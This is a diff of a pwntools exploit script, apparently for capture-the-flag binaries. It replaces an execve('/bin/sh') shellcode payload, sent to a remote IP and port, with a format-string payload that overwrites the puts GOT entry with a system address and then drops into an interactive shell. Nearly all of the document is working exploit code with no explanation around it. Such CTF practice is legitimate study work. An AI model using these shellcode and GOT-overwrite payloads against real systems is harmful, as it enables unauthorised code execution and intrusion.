@@ -8,7 +8,7 @@ context.terminal = ["/usr/bin/tmux", "sp", "-h"]
 f_remote = True if "remote" in sys.argv else False
 f_gdb = True if "gdb" in sys.argv else False
 
-vuln_path = "./shellcode"
+vuln_path = "./gutenbergs_shop"
 libc_path = "./libc.so.6"
 
 elf, rop = ELF(vuln_path), ROP(vuln_path)
@@ -18,7 +18,7 @@ if not f_remote:
     io = process([vuln_path])
     # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
 else:
-    io = remote("52.8.15.62", 8006)
+    io = remote("", 9999)
 
 
 def ddebug(b=""):
@@ -31,21 +31,15 @@ def ddebug(b=""):
 # u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
 
 
-payload = asm('''
-                     xor    rsi, rsi
-                     push   rsi
-                     movabs rdi, 0x68732f2f6e69622f
-                     push   rdi
-                     push   rsp
-                     pop    rdi
-                     push   0x3b
-                     pop    rax
-                     cdq
-                     syscall
-
-''')
-log.success(len(payload))
-ddebug("b *0x40116E\ncontinue")
-io.sendlineafter("keep it shrt!", payload)
+systemaddr = 0x4006a4
+puts_got = elf.got.get("puts", 0)
+payload = f"%{systemaddr}c%10$lln".encode()
+payload = payload.ljust(0x20, b"\x00") + p64(puts_got)
+ddebug()
+io.sendlineafter("printed\n", payload)
 
 io.interactive()
+
+
+
+
